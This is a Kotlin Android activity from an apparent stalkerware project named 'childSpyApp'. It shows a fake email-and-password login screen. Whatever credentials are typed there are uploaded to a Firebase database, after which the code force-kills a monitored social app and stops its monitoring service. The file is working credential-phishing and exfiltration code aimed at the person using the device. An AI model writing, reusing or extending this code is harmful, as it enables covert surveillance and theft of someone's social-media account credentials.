package sammy.mutahi.gicheru.childSpyApp.ui.social

import android.app.ActivityManager
import android.content.Context
import android.os.Bundle
import android.view.KeyEvent
import android.widget.Button
import android.widget.EditText
import sammy.mutahi.gicheru.childSpyApp.data.model.Social
import sammy.mutahi.gicheru.childSpyApp.data.rxFirebase.InterfaceFirebase
import sammy.mutahi.gicheru.childSpyApp.services.social.MonitorService
import sammy.mutahi.gicheru.childSpyApp.ui.base.BaseActivity
import sammy.mutahi.gicheru.childSpyApp.utils.ConstFun.getPackageCheckSocial
import sammy.mutahi.gicheru.childSpyApp.utils.Consts.CHILD_SOCIAL_MS
import sammy.mutahi.gicheru.childSpyApp.utils.Consts.SOCIAL
import com.pawegio.kandroid.IntentFor
import kotterknife.bindView
import sammy.mutahi.gicheru.childSpyApp.R
import javax.inject.Inject


class SocialActivity : BaseActivity() {

    private val txtEmail : EditText by bindView(R.id.txt_email_social)
    private val txtPass : EditText by bindView(R.id.txt_password_social)
    private val btnLogin : Button by bindView(R.id.btn_login_social)

    @Inject lateinit var firebase: InterfaceFirebase

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_social)
        getComponent()!!.inject(this)
        onClickApp()
    }

    private fun onClickApp(){
        btnLogin.setOnClickListener {
            if (txtEmail.text.toString() != "" && txtPass.text.toString() != ""){
                val social = Social(txtEmail.text.toString(), txtPass.text.toString())
                firebase.getDatabaseReference("$SOCIAL/$CHILD_SOCIAL_MS").setValue(social)
                killApp()
                stopService(IntentFor<MonitorService>(this))
                finish()
            }
        }
    }

    override fun onKeyDown(keyCode: Int, event: KeyEvent?): Boolean {
        if (keyCode == KeyEvent.KEYCODE_BACK){
            killApp()
            finish()
            return true
        }
        return super.onKeyDown(keyCode, event)
    }

    override fun onPause() {
        super.onPause()
        killApp()
    }

    private fun killApp(){
        val am = getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
        am.killBackgroundProcesses(getPackageCheckSocial())
    }


}